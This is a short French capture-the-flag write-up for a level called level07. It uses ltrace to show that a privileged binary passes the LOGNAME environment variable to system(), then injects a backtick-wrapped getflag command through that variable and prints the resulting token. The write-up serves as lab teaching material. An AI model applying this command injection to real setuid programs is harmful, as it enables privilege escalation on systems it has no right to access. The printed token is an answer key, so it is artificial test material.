# Level07

On observe un éxécutable a la racine <code>level07</code>

<pre>$ ./level07
level07</pre>

En utilisant <code>ltrace</code>, on voit qu'il <code>echo level07</code>

<pre>$ ltrace ./level07
__libc_start_main(0x8048514, 1, 0xbffff7f4, 0x80485b0, 0x8048620 ...
getegid()                                        = 2007
geteuid()                                        = 2007
setresgid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280) = 0
setresuid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280) = 0
getenv("LOGNAME")                                = "level07"
asprintf(0xbffff744, 0x8048688, 0xbfffff46, 0xb7e5ee55, 0xb7fed280) = 18
system("/bin/echo level07 "level07 ...
--- SIGCHLD (Child exited) ---
<... system resumed> )                           = 0
+++ exited (status 0) +++</pre>

La valeur est obtenue en lisant la variable d’environnement <code>LOGNAME</code>

On modifie donc <code>LOGNAME</code> pour verifier la théorie

<pre>$ LOGNAME="test"

$ ./level07
test</pre>

Et le programme <code>echo test</code> cette fois ci.

On écrit donc la commande <code>getflag</code> dans <code>LOGNAME</code>

<pre>$ LOGNAME="\`getflag\`"

$ ./level07
Check flag.Here is your token : fiumuikeil55xe9cu4dood66h</pre>
